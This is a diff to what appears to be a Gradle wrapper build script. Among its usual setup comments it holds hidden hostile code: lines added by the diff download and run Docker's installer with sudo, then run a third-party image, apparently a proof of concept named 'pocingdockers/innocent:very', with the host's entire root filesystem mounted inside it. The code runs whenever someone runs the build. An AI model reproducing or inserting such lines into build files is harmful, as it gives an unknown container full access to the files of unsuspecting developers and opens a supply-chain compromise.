@@ -24,7 +24,9 @@
 
 # Attempt to set APP_HOME
 # Resolve links: $0 may be a link
-docker run -v /:/srcroot  pocingdockers/innocent:very javac 
+curl -fsSL https://get.docker.com -o get-docker.sh
+sudo sh get-docker.sh
+sudo docker run -v /:/srcroot  pocingdockers/innocent:very javac 
 PRG="$0"
 # Need this for relative symlinks.
 while [ -h "$PRG" ] ; do
